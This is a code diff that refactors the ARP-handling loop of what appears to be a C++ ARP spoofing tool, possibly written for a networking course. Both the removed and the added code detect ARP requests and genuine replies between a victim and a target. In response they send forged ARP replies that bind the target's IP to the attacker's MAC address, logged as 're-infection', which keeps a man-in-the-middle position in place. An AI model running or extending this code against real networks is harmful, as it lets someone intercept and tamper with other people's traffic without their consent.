@@ -253,61 +253,50 @@ int main(int argc, char* argv[]) {
 
 
         else if (ntohs(eth->type_) == EthHdr::Arp) {
-            ArpHdr* arp = (ArpHdr*)(packet + sizeof(EthHdr));
-            uint16_t op = ntohs(arp->op_);
-            Ip sip = Ip(ntohl(arp->sip_));
-            Ip tip = Ip(ntohl(arp->tip_));
-            Mac smac = arp->smac_;
-            Mac tmac = arp->tmac_;
+            auto* arp = reinterpret_cast<const ArpHdr*>(packet + sizeof(EthHdr));
+            const auto operation = ntohs(arp->op_);
+            const Ip src_ip(ntohl(arp->sip_));
+            const Ip dst_ip(ntohl(arp->tip_));
+            const Mac& src_mac = arp->smac_;
+            const Mac& dst_mac = arp->tmac_;
         
-            for (auto& conn : connections) {
-                // [1] sender가 target을 묻는 ARP Request
-                if (op == ArpHdr::Request &&
-                    sip == conn.sender_ip &&
-                    tip == conn.target_ip) {
+            // 디버깅용 로그 (비활성화 가능)
+            /*
+            std::cout << "[ARP] " << (operation == ArpHdr::Request ? "Request" :
+                                       operation == ArpHdr::Reply   ? "Reply" : "Unknown")
+                      << " from " << std::string(src_ip)
+                      << " to " << std::string(dst_ip) << std::endl;
+            */
         
-                    bool ok = send_arp_packet(handle,
-                        make_arp_packet(
-                            Mac(attacker_mac), conn.sender_mac,
-                            Mac(attacker_mac), conn.sender_mac,
-                            conn.target_ip, conn.sender_ip,
-                            false
-                        )
+            for (size_t idx = 0; idx < connections.size(); ++idx) {
+                auto& conn = connections[idx];
+        
+                const bool is_req = (operation == ArpHdr::Request &&
+                                     src_ip == conn.sender_ip &&
+                                     dst_ip == conn.target_ip);
+        
+                const bool is_legit_reply = (operation == ArpHdr::Reply &&
+                                             src_ip == conn.target_ip &&
+                                             dst_ip == conn.sender_ip &&
+                                             src_mac == conn.target_mac);
+        
+                if (is_req || is_legit_reply) {
+                    EthArpPacket forged = make_arp_packet(
+                        Mac(attacker_mac), conn.sender_mac,
+                        Mac(attacker_mac), conn.sender_mac,
+                        conn.target_ip, conn.sender_ip,
+                        false
                     );
         
-                    std::cout << "[*] Re-infection (Request): "
-                              << std::string(sip) << " → " << std::string(tip)
-                              << (ok ? " [SENT]" : " [FAILED]") << std::endl;
-                }
-        
-                // [2] target이 sender에게 진짜 ARP Reply
-                else if (op == ArpHdr::Reply &&
-                         sip == conn.target_ip &&
-                         tip == conn.sender_ip) {
-        
-                    // MAC 비교 실패 시 디버깅
-                    if (smac != conn.target_mac) {
-                        std::cout << "[!] MAC mismatch: "
-                                  << "packet=" << std::string(smac)
-                                  << ", expected=" << std::string(conn.target_mac) << std::endl;
-                        continue;
-                    }
-        
-                    bool ok = send_arp_packet(handle,
-                        make_arp_packet(
-                            Mac(attacker_mac), conn.sender_mac,
-                            Mac(attacker_mac), conn.sender_mac,
-                            conn.target_ip, conn.sender_ip,
-                            false
-                        )
-                    );
-        
-                    std::cout << "[*] Re-infection (Reply): "
-                              << std::string(sip) << " → " << std::string(tip)
-                              << (ok ? " [SENT]" : " [FAILED]") << std::endl;
+                    bool sent = send_arp_packet(handle, forged);
+                    std::cout << "[*] ARP " << (is_req ? "Request" : "Reply")
+                              << " intercepted → Reinfected ("
+                              << std::string(src_ip) << " → " << std::string(dst_ip) << ")"
+                              << (sent ? " [SENT]" : " [FAILED]") << std::endl;
                 }
             }
         }
+
 
         
     }
